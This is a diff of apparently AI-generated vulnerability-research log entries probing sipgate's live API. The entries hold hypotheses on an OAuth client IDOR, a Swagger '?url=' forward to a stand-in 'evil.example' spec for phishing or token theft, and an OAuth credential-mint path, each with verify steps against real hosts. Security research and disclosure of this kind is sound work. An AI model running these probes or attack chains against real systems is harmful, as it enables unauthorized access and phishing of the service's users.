@@ -2779,3 +2779,31 @@ testability: HUMAN_ONLY
 [NEXT] PROBE: enumerate full /authorization/oauth2/clients boundary — GET https://api.sipgate.com/v2/authorization/oauth2/clients (401 baseline), then HEAD+OPTIONS on https://api.sipgate.com/v2/authorization/oauth2/clients/00000000-0000-0000-0000-000000000000/gdpr and GET variants of {uuid} with padded/alternate UUIDs to distinguish 500-throw vs lookup-hit, plus GET https://api.sipgate.com/v2/authorization/oauth2/clients/sipgate-swagger-ui (string-id path: 400 vs 200?).
 [RISK] sipgate: 45 — Surface mapping is comprehensive; NEW real anomaly this cycle (oauth2/clients/{id} subtree escaping the uniform /v2 edge-auth → app-plane 400/500) is the first unauthenticated divergence after 9 days of uniform-401 testing, but yields no data exfiltration without a real client UUID and does not crash state. Swagger url-param chain is strongest reportable asset; growth since prior cycle limited to one confirmed authz-drift + restored spec. All remaining high-value paths stay AUTH_HELPED/HUMAN. Recommend reporting: CORS-credential reflection on /v2, swagger-DOM/url forward chain, and the new oauth2/clients authz-drift as a defense-in-depth + authz-consistency finding.
 ## 2026-09-11 06:08:31 UTC [target] (model bigpickle)
+## 2026-09-11 11:36:33 UTC [target] (model bigpickle)
+[HYP] Unauthenticated app-plane reach into /v2/authorization/oauth2/clients{id}(/gdpr) contradicts uniform edge-401; a registered third-party client UUID likely returns 200 metadata (GDPR/privacy URLs) unauthenticated
+class: IDOR
+asset: api.sipgate.com/v2/authorization/oauth2/clients/{clientId}[/gdpr]
+confidence: 50
+reasoning: Re-verified this cycle: GET /clients→401; GET /clients/sipgate-swagger-ui→400 (string-id validator, app-plane); GET /clients/{0000…|1111…}/gdpr and plain /{uuid}→500 for any well-formed UUID (app lookups-then-throw on miss); OPTIONS/HEAD/subresource variants→404. Divergence from the KB "uniform edge 401" is real, reproduced on 5 request shapes. 500-on-unknown + 400-on-malformed is the classic lookup-miss throw; a real DCR client UUID should yield 200 (metadata + gdpr URLs) past the edge gate.
+evidence_needed: One legitimate third-party realm client UUID (DCR-issued) to confirm 200 vs 500; none obtainable (DCR Trusted-Hosts gated, KB 2026-09-03).
+verify_steps: GET /v2/authorization/oauth2/clients/00000000-0000-0000-0000-000000000000/gdpr →500 (re-verified); compare a registered-uuid extraction from any sipgate artifact if ever leaked; HEAD/OPTIONS on same (404) prove write/read method routing is distinct.
+impact: Unauthenticated oracle for client existence + per-client GDPR/privacy metadata read in the highest-scope OAuth realm; stands as proof-of-authz-drift even without data. MEDIUM standalone, HIGH if a UUID is ever leaked (client-confusion/OAuth-chain on login.sipgate.com third-party realm).
+testability: AUTH_HELPED
+[HYP] Frameable swagger doc with attacker-controlled `?url=` spec forward + implicit `sipgate-swagger-ui` produces malicious OAuth prompt on trusted origin / client-side fetch primitive
+class: AUTH
+asset: api.sipgate.com/v2/doc
+confidence: 48
+reasoning: Confirmed this cycle in swagger-initializer.js: `?url=` → decodeURIComponent, no host check, arbitrary URL fetched from api.sipgate.com origin; doc page 200 and frameable (no XFO/CSP-frame-ancestors header observed); initOAuth hardcodes clientId sipgate-swagger-ui, realm third-party, nonce random; oauth2RedirectUrl same-origin (KB 2026-09-06/07 already REJECTED cross-origin opener token read with Chromium 152). Residual primitive: malicious-content hosting on api.sipgate.com origin + victim-browser arbitrary-URL fetch (client-side SSRF/DNS-rebind) + phishing-grade OAuth prompt at login.sipgate.com showing attacker-chosen scopes.
+evidence_needed: swagger-ui 5.x spec-render XSS (x-example/HTML-in-description) reachable via attacker spec under this bundle; external listener to confirm the `?url=` fetch carries api.sipgate.com origin (HUMAN).
+verify_steps: GET /v2/doc/?url=https://evil.example/s.yaml (fetch fires only in victim browser); GET /v2/doc/ → grep headers (done, frameable); GET /v2/doc/swagger-ui-bundle.js → version scan (component versions 17.0.2/3.20.3/3.14.3/2.3.3/1.3.2, exact swagger-ui pin unresolved).
+impact: Attacker-chosen/dishonest OAuth consent + arbitrary-URL forward from trusted origin; token theft only with a spec-render XSS. HIGH if XSS found, LOW-MEDIUM as phishing/DNS-rebind surface otherwise.
+testability: HUMAN_ONLY
+[HYP] /oauth2/{redirect,callback} spec-claims-NO-security vs FB-JWT 403 masks a credential-mint path
+class: MISCONFIG
+asset: integration.sipgate.com/oauth2/{redirect,callback}
+confidence: 42
+reasoning: Unchanged from KB — spec declares both ops without security, runtime uniform app-403; fabricated code/state →403 (KB REJECTED anonymous mint); public metrics show live firebase_jwt_forbidden_requests. Drift real but gated.
+evidence_needed: Any request shape reaching app plane past the 403 gate (Host/trailing-slash variants) or a dev-scope Firebase token.
+verify_steps: GET/POST both paths w/ code+state (403, re-confirmed KB); OPTIONS preflight (ACAO:* no creds).
+impact: Credential-mint → 26-op integration API (contacts/call-logs/tasks/streaming). CRITICAL but AUTH_HELPED.
+testability: AUTH_HELPED
